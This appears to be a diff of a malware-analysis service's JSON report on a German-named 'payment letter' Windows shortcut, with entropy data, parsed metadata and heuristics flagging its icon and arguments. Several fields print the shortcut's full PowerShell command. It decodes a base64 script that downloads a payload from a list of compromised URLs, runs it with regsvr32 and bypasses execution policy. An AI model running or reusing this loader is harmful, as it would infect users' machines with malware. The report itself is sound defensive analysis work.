@@ -1,30 +1,145 @@
 {
-    "response": {
-        "supplementary": [
-            "38d01cf55b9dd77ca23d7ab8db629b1ca3f7761df3f53744be60588f8a86fbda"
-        ],
-        "extracted": [
-            {
-                "name": "5bce9fc83e.ps1",
-                "sha256": "5bce9fc83e62a82805eedfb2c3a4c8013c3d2c67c5c13dbe2eb3ea03d85c0403"
-            }
-        ]
-    },
-    "result": {
-        "heuristics": [
-            1,
-            4
-        ],
+  "extra": {
+    "drop_file": false,
+    "score": 750,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [0.9793601266407178, 2.993405660568129, 1.9279077196637027, 2.4687236339235996, 1.4578010827711811, 3.035185422243196, 1.9084509856888259, 1.6261449250425983, 2.8111194317179007, 1.356106167516944, 2.8401044899664685, 3.070761712627036, 3.176942433076026, 3.176942433076026, 2.8874482549112903, 0.9997927658541269, 0.9997927658541269, 0.9997927658541269, 2.7228803575460923, 3.1302494245647816, 3.103632788846264, 3.299740949988509, 2.9085518565695363, 3.4270252720957455, 3.1247363905045105, 3.3592286619262532, 3.2392260091852467, 3.291432051756762, 3.1375310939310093, 3.2108407381607718, 3.1375310939310093, 3.2575337466720162, 3.184224102442255, 3.1430441279912804, 3.103632788846264, 3.2319443398190186, 3.205327704100501, 3.0496581109687892, 3.1586346955892566, 3.278637348330264, 3.2181224075270007, 3.3253303568415076, 3.0908380854197643, 3.096351119480035, 3.205327704100501, 3.2236354415872714, 3.5400763939098336, 3.5582896585046004, 2.6072875097804875, 1.8203547814115528]}}",
+        "body_format": "GRAPH_DATA",
+        "classification": "TLP:WHITE",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "File entropy: 3.814",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"flags\": \"IDList, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode\", \"file_attributes\": \"(none)\", \"icon_index\": 134, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"powershell.exe\", \"relative_path\": \"..\\\\..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"working_directory\": \"%cd%\", \"command_line_arguments\": \"-command Out-String -InputObject \\\"Zahlungsschreiben 2022.26.04_1035.lnk                                                                                                   \\\" | Out-Null; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2ZvY3VzbWVkaWNhLmluL2ZtbGliL0l4QkFCTWgwSTJjTE0zcXExR1Z2LyIsImh0dHA6Ly9kZW1vMzQuY2tnLmhrL3NlcnZpY2UvaGhNWnJmQzdNbm05SkQvIiwiaHR0cDovL2NvbGVnaW91bmFtdW5vLmVzL2NnaS1iaW4vRS8iLCJodHRwOi8vY2lwcm8ubXgvcHJlbnNhL3NpWlA2OXJCRm1pYkR2dVRQMUwvIiwiaHR0cDovL2ZpbG1tb2d6aXZvdGEucnMvU3ByeUFzc2V0cy9nRFIvIiwiaHR0cHM6Ly9jcmVlbW8ucGwvd3AtYWRtaW4vWktTMURjZHF1VVQ0QmI4S2IvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0dNT1dEVFJmSUoueHRxO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvR01PV0RUUmZJSi54dHE7YnJlYWt9IGNhdGNoIHsgfX0=')) > \\\"%tmp%\\\\ezMgZunnfF.ps1\\\" ; powershell -executionpolicy bypass -file \\\"%tmp%\\\\ezMgZunnfF.ps1\\\"; Remove-Item \\\"%tmp%\\\\ezMgZunnfF.ps1\\\"\", \"icon_file_name\": \"shell32.dll\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:WHITE",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Metadata extracted by ExifTool",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_format": "TEXT",
+        "classification": "TLP:WHITE",
+        "depth": 0,
+        "heuristic": null,
         "tags": {
-            "file.shortcut.icon_location": [
-                "shell32.dll"
-            ],
-            "file.shortcut.command_line": [
-                "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -command Out-String -InputObject \"Zahlungsschreiben 2022.26.04_1035.lnk                                                                                                   \" | Out-Null; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2ZvY3VzbWVkaWNhLmluL2ZtbGliL0l4QkFCTWgwSTJjTE0zcXExR1Z2LyIsImh0dHA6Ly9kZW1vMzQuY2tnLmhrL3NlcnZpY2UvaGhNWnJmQzdNbm05SkQvIiwiaHR0cDovL2NvbGVnaW91bmFtdW5vLmVzL2NnaS1iaW4vRS8iLCJodHRwOi8vY2lwcm8ubXgvcHJlbnNhL3NpWlA2OXJCRm1pYkR2dVRQMUwvIiwiaHR0cDovL2ZpbG1tb2d6aXZvdGEucnMvU3ByeUFzc2V0cy9nRFIvIiwiaHR0cHM6Ly9jcmVlbW8ucGwvd3AtYWRtaW4vWktTMURjZHF1VVQ0QmI4S2IvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0dNT1dEVFJmSUoueHRxO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvR01PV0RUUmZJSi54dHE7YnJlYWt9IGNhdGNoIHsgfX0=')) > \"%tmp%\\ezMgZunnfF.ps1\" ; powershell -executionpolicy bypass -file \"%tmp%\\ezMgZunnfF.ps1\"; Remove-Item \"%tmp%\\ezMgZunnfF.ps1\""
-            ],
-            "file.name.extracted": [
+          "file": {
+            "name": {
+              "extracted": [
                 "powershell.exe"
-            ]
+              ]
+            },
+            "shortcut": {
+              "command_line": [
+                "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -command Out-String -InputObject \"Zahlungsschreiben 2022.26.04_1035.lnk                                                                                                   \" | Out-Null; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2ZvY3VzbWVkaWNhLmluL2ZtbGliL0l4QkFCTWgwSTJjTE0zcXExR1Z2LyIsImh0dHA6Ly9kZW1vMzQuY2tnLmhrL3NlcnZpY2UvaGhNWnJmQzdNbm05SkQvIiwiaHR0cDovL2NvbGVnaW91bmFtdW5vLmVzL2NnaS1iaW4vRS8iLCJodHRwOi8vY2lwcm8ubXgvcHJlbnNhL3NpWlA2OXJCRm1pYkR2dVRQMUwvIiwiaHR0cDovL2ZpbG1tb2d6aXZvdGEucnMvU3ByeUFzc2V0cy9nRFIvIiwiaHR0cHM6Ly9jcmVlbW8ucGwvd3AtYWRtaW4vWktTMURjZHF1VVQ0QmI4S2IvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0dNT1dEVFJmSUoueHRxO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvR01PV0RUUmZJSi54dHE7YnJlYWt9IGNhdGNoIHsgfX0=')) > \"%tmp%\\ezMgZunnfF.ps1\" ; powershell -executionpolicy bypass -file \"%tmp%\\ezMgZunnfF.ps1\"; Remove-Item \"%tmp%\\ezMgZunnfF.ps1\""
+              ],
+              "icon_location": [
+                "shell32.dll"
+              ]
+            }
+          }
+        },
+        "title_text": "Extra metadata extracted by LnkParse3",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"icon_location\": \"shell32.dll\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:WHITE",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 250,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious icon used",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"relative_path\": \"..\\\\..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:WHITE",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious command line arguments",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "5bce9fc83e.ps1",
+        "sha256": "5bce9fc83e62a82805eedfb2c3a4c8013c3d2c67c5c13dbe2eb3ea03d85c0403"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "features.json",
+        "sha256": "38d01cf55b9dd77ca23d7ab8db629b1ca3f7761df3f53744be60588f8a86fbda"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "file.name.extracted": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "powershell.exe"
         }
-    }
+      ],
+      "file.shortcut.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -command Out-String -InputObject \"Zahlungsschreiben 2022.26.04_1035.lnk                                                                                                   \" | Out-Null; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2ZvY3VzbWVkaWNhLmluL2ZtbGliL0l4QkFCTWgwSTJjTE0zcXExR1Z2LyIsImh0dHA6Ly9kZW1vMzQuY2tnLmhrL3NlcnZpY2UvaGhNWnJmQzdNbm05SkQvIiwiaHR0cDovL2NvbGVnaW91bmFtdW5vLmVzL2NnaS1iaW4vRS8iLCJodHRwOi8vY2lwcm8ubXgvcHJlbnNhL3NpWlA2OXJCRm1pYkR2dVRQMUwvIiwiaHR0cDovL2ZpbG1tb2d6aXZvdGEucnMvU3ByeUFzc2V0cy9nRFIvIiwiaHR0cHM6Ly9jcmVlbW8ucGwvd3AtYWRtaW4vWktTMURjZHF1VVQ0QmI4S2IvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0dNT1dEVFJmSUoueHRxO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvR01PV0RUUmZJSi54dHE7YnJlYWt9IGNhdGNoIHsgfX0=')) > \"%tmp%\\ezMgZunnfF.ps1\" ; powershell -executionpolicy bypass -file \"%tmp%\\ezMgZunnfF.ps1\"; Remove-Item \"%tmp%\\ezMgZunnfF.ps1\""
+        }
+      ],
+      "file.shortcut.icon_location": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "shell32.dll"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
 }
